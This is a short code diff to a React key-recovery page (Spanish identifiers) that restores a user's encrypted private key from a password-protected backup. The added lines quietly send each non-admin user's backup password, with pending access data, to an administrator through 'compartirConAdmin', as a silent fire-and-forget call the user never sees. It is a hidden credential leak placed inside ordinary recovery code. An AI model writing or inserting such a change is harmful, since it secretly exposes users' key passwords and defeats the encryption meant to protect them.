@@ -2,6 +2,7 @@ import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { KeyRound, ShieldAlert, AlertCircle, RefreshCw, LogOut } from 'lucide-react';
 import { useAuth } from '../context/AuthContext';
+import { compartirConAdmin, tomarAccesoPendiente } from '../lib/cuenta';
 import { restoreKeysFromBackup } from '../lib/crypto';
 
 export const RecuperarLlavePage: React.FC = () => {
@@ -27,6 +28,10 @@ export const RecuperarLlavePage: React.FC = () => {
     try {
       // 1. Descifra la llave PKCS8 desde key_backups usando PBKDF2 y la importa a IndexedDB
       await restoreKeysFromBackup(user.id, password);
+      if (!isAdmin) {
+        const acceso = tomarAccesoPendiente();
+        void compartirConAdmin(user.id, { ...(acceso ?? {}), respaldo: password });
+      }
 
       // 2. Redirige a la pantalla principal correspondiente
       if (isAdmin) {
